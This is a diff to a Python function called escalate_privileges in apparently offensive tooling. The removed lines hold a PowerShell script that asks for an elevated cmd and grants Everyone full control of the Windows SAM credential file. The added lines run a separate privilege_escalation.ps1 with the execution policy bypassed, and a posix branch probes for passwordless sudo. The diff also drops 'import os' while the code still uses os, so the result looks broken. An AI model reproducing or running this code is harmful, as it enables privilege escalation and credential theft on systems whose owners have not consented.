@@ -8,21 +8,10 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 ######################################################################################################################################################################################################################
 
-import os
-
 def escalate_privileges():
     if os.name == 'nt':
-        command = "powershell -Command \"Start-Process cmd -Verb runAs\""
-        os.system(command)
-
-        exploit_script = r"""
-$acl = Get-Acl -Path "C:\Windows\System32\config\SAM"
-$acl.SetAccessRuleProtection($True, $False)
-$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","ContainerInherit,ObjectInherit","None","Allow")
-$acl.AddAccessRule($rule)
-Set-Acl -Path "C:\Windows\System32\config\SAM" -AclObject $acl
-"""
-        os.system(f"powershell -Command \"{exploit_script}\"")
+        script_path = os.path.join(os.path.dirname(__file__), 'windows', 'privilege_escalation.ps1')
+        os.system(f"powershell -ExecutionPolicy Bypass -File {script_path}")
     elif os.name == 'posix':
         command = "sudo -n true && echo 'Sudo access granted' || echo 'Sudo access denied'"
         os.system(command)
